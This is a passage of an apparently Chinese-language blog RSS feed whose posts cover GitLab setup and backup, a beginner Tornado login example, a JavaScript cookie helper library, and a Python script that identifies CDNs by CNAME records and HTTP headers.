reber@ubuntu:/var/opt/gitlab$ sudo ls nginx/conf/
gitlab-http.conf  htpasswd  nginx.conf
# 配置nginx
reber@ubuntu:/var/opt/gitlab$ sudo vim nginx/conf/gitlab-http.conf
......
server {
  listen *:80; # 这里可以修改Web端的端口

  # 添加下面两句
  auth_basic &amp;quot;reber&#39;s gitlab&amp;quot;;
  auth_basic_user_file htpasswd;  #指明密码文件路径

  server_name 192.168.188.160;
  server_tokens off; ## Don&#39;t show the nginx version number, a security best practice

# 重启nginx
reber@ubuntu:/var/opt/gitlab$ sudo gitlab-ctl restart nginx
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/gitlab_401_verify.png&#34; alt=&#34;401验证&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x05-汉化:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x05 汉化&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 首先检查版本
reber@ubuntu:~/Desktop$ cat /opt/gitlab/embedded/service/gitlab-rails/VERSION
 8.8.0
reber@ubuntu:~/Desktop$ git clone https://gitlab.com/larryli/gitlab.git
reber@ubuntu:~/Desktop$ cd gitlab/
# 比较8-8-stable(英文)和8-8-zh(汉化后)的区别然后导出为补丁
reber@ubuntu:~/Desktop/gitlab$ git diff origin/8-8-stable origin/8-8-zh &amp;gt; /tmp/8.8.diff
# 应用补丁
reber@ubuntu:~/Desktop/gitlab$ sudo patch -d /opt/gitlab/embedded/service/gitlab-rails -p1 &amp;lt; /tmp/8.8.diff
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x06-添加ssh公钥:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x06 添加ssh公钥&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;首先用邮箱514581887@qq.com注册一个用户，用户名为55555
$ ssh-keygen -t rsa -C &amp;quot;514581887@qq.com&amp;quot; #在本机生成秘钥对
$ cat /home/reber/.ssh/id_rsa.pub #查看公钥
然后使用用户55555登录Web页面，添加上面文件id_rsa.pub中的公钥
#注释：上面添加的公钥存储在服务端的/var/opt/gitlab/.ssh/authorized_keys中

由于gitlab服务端使用的不是标准的22端口，所以本机要添加一个文件
$ cd ~/.ssh
$ vim config
  Host 192.168.188.160 #gitlab服务器的ip
  User 55555
  Port 2222 # gitlab服务器的ssh端口
  IdentityFile /home/reber/.ssh/id_rsa # 本地私钥文件id_rsa的路径

添加用户名和密码
$ git config --global user.name &amp;quot;55555&amp;quot;
$ git config --global user.email &amp;quot;514581887@qq.com&amp;quot;

检测是否添加成功
$ ssh -T git@192.168.188.160
  Welcome to GitLab, 55555! # 出现这句话证明成功

若出现错误：&amp;quot;git: &#39;credential-cache&#39; is not a git command.&amp;quot;
则运行：&amp;quot;git config --global --unset credential.helper&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x07-推送自己的代码:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x07 推送自己的代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 首先clone项目
[reber@WYB ~]$ git clone git@192.168.188.160:first_group/first_project.git
[reber@WYB first_project]$ cd first_project
[reber@WYB first_project]$ git branch 163 # 创建自己的分支163
[reber@WYB first_project]$ git checkout 163 # 切换到分支
Switched to branch &#39;163&#39;
[reber@WYB first_project]$ git branch # 查看当前分支情况
* 163
  master
[reber@WYB first_project]$ vim 163_4_file
[reber@WYB first_project]$ git add 163_4_file # 添加项目代码文件
[reber@WYB first_project]$ git commit -m &amp;quot;add file 163_4_file&amp;quot;
[163 d5df55a] add file 163_4_file
 1 files changed, 1 insertions(+), 0 deletions(-)
 create mode 100644 163_4_file
[reber@WYB first_project]$ git push origin 163 # push代码
Counting objects: 4, done.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 285 bytes, done.
Total 3 (delta 1), reused 0 (delta 0)
To git@106.75.87.166:first_group/first_project.git
 * [new branch]      163 -&amp;gt; 163
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;web端请求合并代码到master分支

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/gitlab_pull_request.png&#34; alt=&#34;请求合并代码&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 下面的操作做不做都行
[reber@WYB first_project]$ git checkout master # 切换回master分支
Switched to branch &#39;master&#39;
Your branch is ahead of &#39;origin/master&#39; by 1 commit.
[reber@WYB first_project]$ git branch -D 163 # 删除分支163
Deleted branch 163 (was d5df55a).
[reber@WYB first_project]$ git branch # 再次查看分支
* master
[reber@WYB first_project]$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x08-结果:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x08 结果&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/gitlab_result1.png&#34; alt=&#34;结果1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/gitlab_result2.png&#34; alt=&#34;结果2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x09-备份与还原:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x09 备份与还原&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;注意：若要迁移，则新服务器上的Gitlab的版本必须与创建备份时的Gitlab版本号相同&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 如果出现backups文件夹没有权限，那就给700，所有者为git:git

ubuntu@1fa167:~$ sudo gitlab-rake gitlab:backup:create
  # 出现错误：
  Errno::ENOENT: No such file or directory @ realpath_rec - /var/opt/gitlab/gitlab-rails/shared/registry
# 新建文件
ubuntu@1fa167:~$ sudo mkdir /var/opt/gitlab/gitlab-rails/shared/registry
ubuntu@1fa167:~$ sudo chmod 700 /var/opt/gitlab/gitlab-rails/shared/registry
ubuntu@1fa167:~$ sudo chown git:git /var/opt/gitlab/gitlab-rails/shared/registry
# 备份
ubuntu@1fa167:~$ sudo gitlab-rake gitlab:backup:create

# 还原：
ubuntu@1fa167:~$ sudo ls -al /var/opt/gitlab/backups/
total 34500
drwx------  2 git  git      4096 Feb 17 15:09 .
drwxr-xr-x 13 root root     4096 Feb 17 15:01 ..
-rw-------  1 git  git  35317760 Feb 17 15:09 1487315379_gitlab_backup.tar
ubuntu@1fa167:~$ sudo gitlab-rake gitlab:backup:restore BACKUP=1487315379
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>初识Tornado</title>
      <link>http://wyb0.com/posts/tornado-basis/</link>
      <pubDate>Tue, 03 Jan 2017 18:43:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/tornado-basis/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime003.jpg&#34; alt=&#34;命运石之门&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-简介:a25cd61f4b2b813ec7f88de601554ff8&#34;&gt;0x00 简介&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;Tornado是一个用Python写的相对简单的、不设障碍的Web服务器架构,用以处理上万的同时的
连接口,让实时的Web服务通畅起来。虽然跟现在的一些用Python写的Web架构相似,比如Django,
但Tornado更注重速度,能够处理海量的同时发生的流量。 
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-示例:a25cd61f4b2b813ec7f88de601554ff8&#34;&gt;0x01 示例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;main.py代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import tornado.ioloop
import tornado.web

class IndexHandler(tornado.web.RequestHandler):
    def get(self):   #访问根时触发这个函数
        name = self.get_argument(&#39;name&#39;,&#39;wyb&#39;)
        self.write(&#39;Hello,&#39; + name)
        self.write(&#39;&amp;lt;br /&amp;gt;&amp;lt;a href=&amp;quot;/login&amp;quot;&amp;gt;login&amp;lt;/a&amp;gt;&#39;)

class MyLoginHandler(tornado.web.RequestHandler):
    def get(self):
        self.render(&#39;login.html&#39;)  
#若用户请求/login页面则将login.html发送给客户端，客户会看的一个登陆表单

    def post(self):   #当用户点击提交按钮是触发这个函数
        name = self.get_argument(&#39;name&#39;)   #接收表单的name
        password = self.get_argument(&#39;password&#39;)   #接收表单的password
        self.write(&amp;quot;you name is:%s\nyou password is:%s&amp;quot; % (name,password))


def get_app():
    handlers = [
        (r&amp;quot;/&amp;quot;,IndexHandler),    #代表请求/的都让IndexHandler处理
        (r&amp;quot;/login&amp;quot;,MyLoginHandler),    #表示请求/login页面的让MyLoginHandler处理
    ]
    app = tornado.web.Application(handlers=handlers)
    return app

if __name__ == &#39;__main__&#39;:
    app = get_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.instance().start()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;login.html代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;form&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;form action=&amp;quot;/login&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
        Name: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot;&amp;gt;&amp;lt;br /&amp;gt;
        Password: &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;br /&amp;gt;
        &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;login&amp;quot;&amp;gt;
    &amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-结果如下:a25cd61f4b2b813ec7f88de601554ff8&#34;&gt;0x03 结果如下&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tornado_test1.png&#34; alt=&#34;初识tornado1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tornado_test2.png&#34; alt=&#34;初识tornado2&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tornado_test3.png&#34; alt=&#34;初识tornado3&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>[转]JS操作cookie方法的封装</title>
      <link>http://wyb0.com/posts/js-package-cookie-function/</link>
      <pubDate>Tue, 27 Dec 2016 11:49:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/js-package-cookie-function/</guid>
      <description>

&lt;p&gt;原文链接：&lt;a href=&#34;http://www.wyzu.cn/2015/0123/107167.html&#34;&gt;http://www.wyzu.cn/2015/0123/107167.html&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x00-实现功能:19df12ac4dda39d32939fe2aeb376921&#34;&gt;0x00 实现功能&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;添加cookie&lt;/li&gt;
&lt;li&gt;获取所有cookie&lt;/li&gt;
&lt;li&gt;根据名字获取单个cookie的值&lt;/li&gt;
&lt;li&gt;移除所有cookie&lt;/li&gt;
&lt;li&gt;根据名字移除单个cookie&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x01-封装cookie-js源码:19df12ac4dda39d32939fe2aeb376921&#34;&gt;0x01 封装cookie.js源码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;/*
 * 名称和值传送时必须是经过RUL编码的
 * cookie绑定在指定的域名下，非本域无法共享cookie，但是可以是在主站共享cookie给子站
 * cookie的名称不分大小写；同时建议将cookie URL编码
 * 建议针对cookie设置expires、domain、 path；每个cookie小于4KB
 **/

(function(global){
    function getCookiesObj() {
        //获得cookie对象
        var cookies = {};
        if (document.cookie) {
            var objs = document.cookie.split(&#39;; &#39;);
            for (var i in objs) {
                var index = objs[i].indexOf(&#39;=&#39;),
                    name = objs[i].substr(0,index),
                    value = objs[i].substr(index+1,objs[i].length);
                cookies[name] = value;
            }
        }
        return cookies;
    }

    function set(sName,sValue,Opts) {
        //设置cookie
        // Opts expires,path,domain,secure
        if (sName &amp;amp;&amp;amp; sValue) {
            var cookie = encodeURIComponent(sName)+&#39;=&#39;+encodeURIComponent(sValue);
            
            if (Opts) {
                if (Opts.expires) {
                    var date = new Date();
                    date.setTime(date.getTime()+Opts.expires*24*3600*1000)
                    cookie += &#39;; expires=&#39; + date.toGMTString();
                }
                if (Opts.path) {
                    cookie += &#39;; path=&#39; + Opts.path;
                }
                if (Opts.domain) {
                    cookie += &#39;; domain=&#39; + Opts.domain;
                }
                if (Opts.secure) {
                    cookie += &#39;; secure&#39;;
                }
            }
            document.cookie = cookie;
            return cookie;
        } else {
            return &#39;&#39;;
        }
    }

    function getCookie(name) {
        //得到某个cookie
        return decodeURIComponent(getCookiesObj()[name]) || null;
    }

    function getCookies() {
        //得到所有cookie
        return getCookiesObj();
    }

    function remove(name) {
        //移除某个cookie
        if (getCookiesObj()[name]) {
            var date = new Date();
            date.setDate(date.getDate()-1);
            document.cookie = name + &#39;=; expires=&#39;+date.toGMTString();
        }
    }

    function clear() {
        // 移除所有cookie
        var cookies = getCookiesObj();
        var date = new Date();
        date.setDate(date.getDate()-1);
        for (var key in cookies) {
            document.cookie = key + &#39;=; expires=&#39;+date.toGMTString();
        }
    }

    function noConflict(name) {
        //解决冲突
        if (name &amp;amp;&amp;amp; typeof name === &#39;string&#39;) {
            if (name &amp;amp;&amp;amp; window[&#39;cookie&#39;]) {
                window[name] = window[&#39;cookie&#39;];
                delete window[&#39;cookie&#39;];
                return window[name];
            }
        } else {
            return window[&#39;cookie&#39;];
            delete window[&#39;cookie&#39;];
        }
    }

    global[&#39;cookie&#39;] = {
        &#39;set&#39;: set,
        &#39;getCookies&#39;: getCookies,
        &#39;getCookie&#39;: getCookie,
        &#39;remove&#39;: remove,
        &#39;clear&#39;: clear,
        &#39;noConflict&#39;: noConflict
    };
})(window);
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-利用的a-html源码:19df12ac4dda39d32939fe2aeb376921&#34;&gt;0x02 利用的a.html源码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
        &amp;lt;title&amp;gt;cookie example&amp;lt;/title&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;./cookie.js&amp;quot; &amp;gt;&amp;lt;/script&amp;gt;
        &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
            console.log(&#39;----------cookie对象-------------&#39;);
            console.log(cookie);
            console.log(&#39;----------对象-------------&#39;);
            console.log(cookie.getCookies());
            console.log(&#39;----------设置cookie-------------&#39;);
            console.log(cookie.set(&#39;name&#39;, &#39;wlh&#39;));
            console.log(&#39;----------设置cookie 123-------------&#39;);
            console.log(cookie.set(&#39;name&#39;, &#39;wlh123&#39;));
            console.log(&#39;----------设置cookie age-------------&#39;);
            console.log(cookie.set(&#39;age&#39;, 20));
            // alert(document.cookie);
            console.log(&#39;----------获取cookie-------------&#39;);
            console.log(cookie.getCookie(&#39;name&#39;));
            console.log(&#39;----------获取所有-------------&#39;);
            console.log(cookie.getCookies());
            console.log(&#39;----------清除age-------------&#39;);
            console.log(cookie.remove(&#39;age&#39;));
            console.log(&#39;----------获取所有-------------&#39;);
            console.log(cookie.getCookies());
            console.log(&#39;----------清除所有-------------&#39;);
            console.log(cookie.clear());
            console.log(&#39;----------获取所有-------------&#39;);
            console.log(cookie.getCookies());
            console.log(&#39;----------解决冲突-------------&#39;);
            var $Cookie = cookie.noConflict(true /*a new name of cookie*/);
            console.log($Cookie);
            console.log(&#39;----------使用新的命名-------------&#39;);
            console.log($Cookie.getCookies());
        &amp;lt;/script&amp;gt;
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-结果:19df12ac4dda39d32939fe2aeb376921&#34;&gt;0x03 结果&lt;/h3&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/js_cookie.png&#34; alt=&#34;调用封装文件操作cookie&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现CDN的判断</title>
      <link>http://wyb0.com/posts/python-cnd-check/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-cnd-check/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime002.jpg&#34; alt=&#34;银魂&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-什么是cdn:46839201dd3d7ca552ff68a9feb5a581&#34;&gt;0x00 什么是CDN&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容，
运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的
缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点，
你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-判断方法:46839201dd3d7ca552ff68a9feb5a581&#34;&gt;0x01 判断方法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;可以查询CNAME记录，每个cdn厂商都有特有的特征串&lt;/li&gt;
&lt;li&gt;查看http返回头的头部信息&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-代码:46839201dd3d7ca552ff68a9feb5a581&#34;&gt;0x02 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;首先安装dnspython这个第三方模块：pip install dnspython&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import dns.resolver
import urllib2
import urlparse

class CdnCheck(object):
    def __init__(self, url):
        super(CdnCheck, self).__init__()
        self.cdninfo()
        self.url = url
        self.cnames = []
        self.headers = []

    def get_cnames(self): # get all cname
        furl = urlparse.urlparse(self.url)
        url = furl.netloc
        # print url

        rsv = dns.resolver.Resolver()
        # rsv.nameservers = [&#39;114.114.114.114&#39;]
        try:
            answer = dns.resolver.query(url,&#39;CNAME&#39;)
        except Exception as e:
            self.cnames = None
            # print &amp;quot;ERROR: %s&amp;quot; % e
        else:
            cname = [_.to_text() for _ in answer][0]
            self.cnames.append(cname)
            self.get_cname(cname)

    def get_cname(self,cname): # get cname
        try:
            answer = dns.resolver.query(cname,&#39;CNAME&#39;)
            cname = [_.to_text() for _ in answer][0]
            self.cnames.append(cname)
            self.get_cname(cname)
        except dns.resolver.NoAnswer:
            pass

    def get_headers(self): # get header
        try:
            resp = urllib2.urlopen(self.url)
        except Exception as e:
            self.headers = None
            # print &amp;quot;ERROR: %s&amp;quot; % e
        else:
            headers = str(resp.headers).lower()
            self.headers = headers

    def matched(self, context, *args): # Matching string 
        if not isinstance(context, basestring):
            context = str(context)

        func = lambda x, y: y in x
        # if any(func(context, pattern) for pattern in args):
        #     return True
        # else:
        #     return False
        for pattern in args:
            if func(context,pattern):
                return pattern
        return False

    def check(self):
        flag = None
        self.get_cnames()
        self.get_headers()
        if self.cnames:
            # print self.cnames
            flag = self.matched(self.cnames,*self.cdn[&#39;cname&#39;])
            if flag:
                return {&#39;Status&#39;:True, &#39;CDN&#39;:self.cdn[&#39;cname&#39;].get(flag)}
        if not flag and self.headers:
            flag = self.matched(self.headers,*self.cdn[&#39;headers&#39;])
            if flag:
                return {&#39;Status&#39;:True, &#39;CDN&#39;:&#39;unknown&#39;}
        return {&#39;Status&#39;:False, &#39;CNAME&#39;:self.cnames, &#39;Headers&#39;:self.headers}

    def cdninfo(self):
        self.cdn = {
            &#39;headers&#39;: set([
                &#39;via&#39;,
                &#39;x-via&#39;,
                &#39;by-360wzb&#39;,
                &#39;by-anquanbao&#39;,
                &#39;cc_cache&#39;,
                &#39;cdn cache server&#39;,
                &#39;cf-ray&#39;,
                &#39;chinacache&#39;,
                &#39;verycdn&#39;
                &#39;webcache&#39;,
                &#39;x-cacheable&#39;,
                &#39;x-fastly&#39;,
                &#39;yunjiasu&#39;,
            ]),
            &#39;cname&#39;: {
                &#39;tbcache.com&#39;:u&#39;taobao&#39;, # 应该是淘宝自己的。。。。
                &#39;tcdn.qq.com&#39;:u&#39;tcdn.qq.com&#39;, # 应该是腾讯的。。。
                &#39;00cdn.com&#39;:u&#39;XYcdn&#39;, # 星域cdn
                &#39;21cvcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21okglb.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21speedcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21vianet.com.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21vokglb.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;360wzb.com&#39;:u&#39;360&#39;, # 360网站卫士
                &#39;51cdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;acadn.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;aicdn.com&#39;:u&#39;UPYUN&#39;, # 又拍云
                &#39;akadns.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai-staging.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai.com&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamaitech.net&#39;:u&#39;Akamai&#39;, # 易通锐进
                &#39;akamaized.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;alicloudlayer.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;alikunlun.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;aliyun-inc.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;aliyuncs.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;amazonaws.com&#39;:u&#39;Amazon Cloudfront&#39;, # 亚马逊
                &#39;anankecdn.com.br&#39;:u&#39;Ananke&#39;, # Ananke
                &#39;aodianyun.com&#39;:u&#39;VOD&#39;, # 奥点云
                &#39;aqb.so&#39;:u&#39;AnQuanBao&#39;, # 安全宝
                &#39;awsdns&#39;:u&#39;KeyCDN&#39;, # KeyCDN
                &#39;azioncdn.net&#39;:u&#39;Azion&#39;, # Azion
                &#39;azureedge.net&#39;:u&#39;Azure CDN&#39;, # Microsoft Azure
                &#39;bdydns.com&#39;:u&#39;Baiduyun&#39;, # 百度云
                &#39;bitgravity.com&#39;:u&#39;Tata Communications&#39;, # 待定
                &#39;cachecn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;cachefly.net&#39;:u&#39;Cachefly&#39;, # Cachefly
                &#39;ccgslb.com&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;ccgslb.net&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;cdn-cdn.net&#39;:u&#39;&#39;, # 待定
                &#39;cdn.cloudflare.net&#39;:u&#39;CloudFlare&#39;, # CloudFlare
                &#39;cdn.dnsv1.com&#39;:u&#39;Tengxunyun&#39;, # 腾讯云
                &#39;cdn.ngenix.net&#39;:u&#39;&#39;, # 待定
                &#39;cdn20.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;cdn77.net&#39;:u&#39;CDN77&#39;, # CDN77
                &#39;cdn77.org&#39;:u&#39;CDN77&#39;, # CDN77
                &#39;cdnetworks.net&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;cdnify.io&#39;:u&#39;CDNify&#39;, # CDNify
                &#39;cdnnetworks.com&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;cdnsun.net&#39;:u&#39;CDNsun&#39;, # CDNsun
                &#39;cdntip.com&#39;:u&#39;QCloud&#39;, # 腾讯云
                &#39;cdnudns.com&#39;:u&#39;PowerLeader&#39;, # 宝腾互联
                &#39;cdnvideo.ru&#39;:u&#39;CDNvideo&#39;, # CDNvideo
                &#39;cdnzz.net&#39;:u&#39;SuZhi&#39;, # 速致
                &#39;chinacache.net&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;chinaidns.net&#39;:u&#39;LineFuture&#39;, # 澜景网络
                &#39;chinanetcenter.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;cloudcdn.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;cloudfront.net&#39;:u&#39;Amazon Cloudfront&#39;, # Amazon
                &#39;customcdn.cn&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;customcdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;dnion.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;dnspao.com&#39;:u&#39;&#39;, # 待定
                &#39;edgecastcdn.net&#39;:u&#39;EdgeCast&#39;, # EdgeCast
                &#39;edgesuite.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;ewcache.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;fastcache.com&#39;:u&#39;FastCache&#39;, # 速网科技
                &#39;fastcdn.cn&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;fastly.net&#39;:u&#39;Fastly&#39;, # Fastly
                &#39;fastweb.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;fastwebcdn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;footprint.net&#39;:u&#39;Level3&#39;, # Level3
                &#39;fpbns.net&#39;:u&#39;Level3&#39;, # Level3
                &#39;fwcdn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;fwdns.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;globalcdn.cn&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;hacdn.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;hadns.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;hichina.com&#39;:u&#39;WWW&#39;, # 万网
                &#39;hichina.net&#39;:u&#39;WWW&#39;, # 万网
                &#39;hwcdn.net&#39;:u&#39;Highwinds&#39;, # Highwinds
                &#39;incapdns.net&#39;:u&#39;Incapsula&#39;, # Incapsula
                &#39;internapcdn.net&#39;:u&#39;Internap&#39;, # Internap
                &#39;jiashule.com&#39;:u&#39;Jiasule&#39;, # 加速乐
                &#39;kunlun.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kunlunar.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kunlunca.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kxcdn.com&#39;:u&#39;KeyCDN&#39;, # KeyCDN
                &#39;lswcdn.net&#39;:u&#39;Leaseweb&#39;, # Leaseweb
                &#39;lxcdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;lxdns.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;mwcloudcdn.com&#39;:u&#39;QUANTIL&#39;, # QUANTIL
                &#39;netdna-cdn.com&#39;:u&#39;MaxCDN&#39;, # MaxCDN
                &#39;okcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;okglb.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;ourwebcdn.net&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;ourwebpic.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
